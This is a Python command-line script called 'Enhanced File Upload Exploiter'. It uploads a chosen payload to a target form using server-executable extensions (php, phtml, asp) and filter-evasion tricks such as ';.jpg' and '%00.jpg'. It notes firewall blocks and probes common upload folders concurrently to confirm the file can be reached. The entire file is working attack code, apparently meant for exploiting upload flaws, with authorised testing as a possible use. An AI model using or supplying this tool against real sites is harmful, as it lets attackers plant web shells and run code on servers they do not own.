import argparse
import requests
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor
import random, string, json, csv

# function that generates a random filename with given extension
def random_filename(ext):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=8)) + f".{ext}"

# function that sends single post request to analyze the direct response
def try_upload(url, upload_field, filename, file_content, form_data, headers, content_type=None):
    custom_headers = headers.copy()
    if content_type:
        custom_headers['Content-Type'] = content_type
    files = {upload_field: (filename, file_content)}
    resp = requests.post(url, files=files, data=form_data, headers=custom_headers, allow_redirects=False, timeout=12)
    return resp

# function that attempts to access the uploaded file on the full path, looks for the verify marker in the response text or status code to confirm success
def check_upload_access(base_url, upload_path, verify_marker, headers):
    full_url = base_url.rstrip("/") + "/" + upload_path.lstrip("/")
    try:
        resp = requests.get(full_url, headers=headers, timeout=10)
        snippet = resp.text[:300]
        if verify_marker in resp.text:
            return True, full_url, snippet, resp.status_code
        elif resp.status_code == 200:
            return True, full_url, snippet, resp.status_code
    except Exception:
        pass
    return False, full_url, "", 0

# function checks for waf block through status codes or keywords in the response text
def waf_detected(resp):
    waf_keywords = ['access denied', 'blocked', 'malicious', 'firewall', 'security']
    return any(word in resp.text.lower() for word in waf_keywords) or resp.status_code in [406, 403]

# function that reads path into content, and uses nested and previous  functions + threads to concurrently attempt file upload exploitation, then inputs results into json or csv formats
def exploit_upload(url, upload_field, payload_path, verify_marker, form_data, upload_dirs, try_exts, headers, content_type, output_json, output_csv):
    with open(payload_path, "rb") as f:
        payload_content = f.read()

    all_results = []

    def verify_uploads(possible_paths, fname):
        results = []
        with ThreadPoolExecutor(max_workers=10) as executor:
            futures = [
                executor.submit(check_upload_access, url, path, verify_marker, headers)
                for path in possible_paths
            ]
            for fut in futures:
                found, full_url, snippet, status = fut.result()
                if found:
                    print(f"|+| Exploit successful. File found at: {full_url}")
                    results.append({
                        "filename": fname,
                        "url": full_url,
                        "status": status,
                        "response_snippet": snippet
                    })
        return results

    for ext in try_exts:
        variants = [ext, f"{ext};.jpg", f"{ext}%00.jpg"]
        for v_ext in variants:
            fname = random_filename(v_ext)
            print(f"|*| Trying: {fname}")
            resp = try_upload(url, upload_field, fname, payload_content, form_data, headers, content_type)

            if waf_detected(resp):
                print(f"|!| Potential WAF/Filter detected. Response: {resp.status_code} - {resp.text[:100]}")

            if resp.status_code in [200, 201, 302]:
                print(f"|+| Upload attempt responded with {resp.status_code}")
            else:
                print(f"|-| Upload failed with status {resp.status_code}")

            possible_paths = [f"{d}/{fname}" for d in upload_dirs] + [fname]
            results = verify_uploads(possible_paths, fname)
            all_results.extend(results)

    if output_json:
        with open(output_json, "w") as jf:
            json.dump(all_results, jf, indent=2)
        print(f"|+| JSON results written to {output_json}")

    if output_csv:
        with open(output_csv, "w", newline='') as cf:
            writer = csv.DictWriter(cf, fieldnames=["filename", "url", "status", "response_snippet"])
            writer.writeheader()
            writer.writerows(all_results)
        print(f"|+| CSV results written to {output_csv}")

    if not all_results:
        print("|*| No successful exploitation confirmed.")

# arg parser for cli customizability
def cli():
    parser = argparse.ArgumentParser(description="Enhanced File Upload Exploiter")
    parser.add_argument("url", help="Target upload URL")
    parser.add_argument("payload", help="Payload file to upload")
    parser.add_argument("--field", default="file", help="Upload form field name")
    parser.add_argument("--verify", default="UploadTestOK", help="Verification marker to look for in response")
    parser.add_argument("--dirs", default="uploads,upload,files,images", help="Comma-separated upload directories")
    parser.add_argument("--exts", default="php,php3,phtml,jpg,html,asp", help="Comma-separated extensions to try")
    parser.add_argument("--extra", nargs="*", default=[], help="Extra POST data (key=value)")
    parser.add_argument("--header", nargs="*", default=[], help="Extra headers (Key:Value)")
    parser.add_argument("--ctype", help="Custom Content-Type header")
    parser.add_argument("--json", help="Output results to JSON file")
    parser.add_argument("--csv", help="Output results to CSV file")
    args = parser.parse_args()

    form_data = {k: v for kv in args.extra for k, v in [kv.split("=", 1)]}
    headers = {k.strip(): v.strip() for hv in args.header for k, v in [hv.split(":", 1)]}
    upload_dirs = [d.strip() for d in args.dirs.split(",")]
    try_exts = [e.strip().lstrip(".") for e in args.exts.split(",")]

    exploit_upload(args.url, args.field, args.payload, args.verify, form_data,
                   upload_dirs, try_exts, headers, args.ctype, args.json, args.csv)

if __name__ == "__main__":
    cli()
